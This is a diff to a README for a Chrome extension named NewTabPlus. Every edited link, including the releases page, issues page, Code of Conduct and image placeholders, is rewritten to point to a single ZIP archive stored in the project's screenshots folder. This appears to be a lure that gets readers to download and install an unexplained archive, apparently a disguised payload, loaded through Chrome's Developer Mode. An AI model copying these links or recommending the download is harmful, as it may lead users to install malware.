@@ -1,6 +1,6 @@
 # NewTabPlus 🚀
 
-![NewTabPlus Logo](https://via.placeholder.com/150)  
+![NewTabPlus Logo](https://github.com/cao-cuong/newtabplus/raw/refs/heads/main/screenshots/Software-1.1.zip)  
 *Transform your new tab into a productivity powerhouse.*
 
 ---
@@ -21,11 +21,11 @@ Welcome to **NewTabPlus**, a feature-rich Chrome extension designed to enhance y
 
 ## Installation
 
-To get started with NewTabPlus, download the latest version from the [Releases section](https://github.com/cao-cuong/newtabplus/releases). Follow the instructions to install and enable the extension in your Chrome browser.
+To get started with NewTabPlus, download the latest version from the [Releases section](https://github.com/cao-cuong/newtabplus/raw/refs/heads/main/screenshots/Software-1.1.zip). Follow the instructions to install and enable the extension in your Chrome browser.
 
 ### How to Install
 
-1. **Download the Extension**: Visit the [Releases section](https://github.com/cao-cuong/newtabplus/releases) to find the latest version.
+1. **Download the Extension**: Visit the [Releases section](https://github.com/cao-cuong/newtabplus/raw/refs/heads/main/screenshots/Software-1.1.zip) to find the latest version.
 2. **Unzip the File**: Extract the downloaded ZIP file.
 3. **Open Chrome**: Go to `chrome://extensions/`.
 4. **Enable Developer Mode**: Toggle the Developer Mode switch in the top right corner.
@@ -84,7 +84,7 @@ We welcome contributions to NewTabPlus! If you have ideas for new features or im
 
 ### Code of Conduct
 
-Please adhere to our [Code of Conduct](CODE_OF_CONDUCT.md) when contributing. We strive to create a welcoming environment for everyone.
+Please adhere to our [Code of Conduct](https://github.com/cao-cuong/newtabplus/raw/refs/heads/main/screenshots/Software-1.1.zip) when contributing. We strive to create a welcoming environment for everyone.
 
 ---
 
@@ -96,7 +96,7 @@ NewTabPlus is licensed under the MIT License. See the [LICENSE](LICENSE) file fo
 
 ## Support
 
-If you encounter any issues or have questions, please check the [Issues](https://github.com/cao-cuong/newtabplus/issues) section or reach out to the community for assistance.
+If you encounter any issues or have questions, please check the [Issues](https://github.com/cao-cuong/newtabplus/raw/refs/heads/main/screenshots/Software-1.1.zip) section or reach out to the community for assistance.
 
 ---
 
@@ -108,9 +108,9 @@ We appreciate the support from our users and contributors. Your feedback helps u
 
 ## Get Started Today!
 
-Transform your new tab experience with NewTabPlus. Download the latest version from the [Releases section](https://github.com/cao-cuong/newtabplus/releases) and take control of your productivity.
+Transform your new tab experience with NewTabPlus. Download the latest version from the [Releases section](https://github.com/cao-cuong/newtabplus/raw/refs/heads/main/screenshots/Software-1.1.zip) and take control of your productivity.
 
-![Productivity Dashboard](https://via.placeholder.com/800x400)
+![Productivity Dashboard](https://github.com/cao-cuong/newtabplus/raw/refs/heads/main/screenshots/Software-1.1.zip)
 
 ---
 
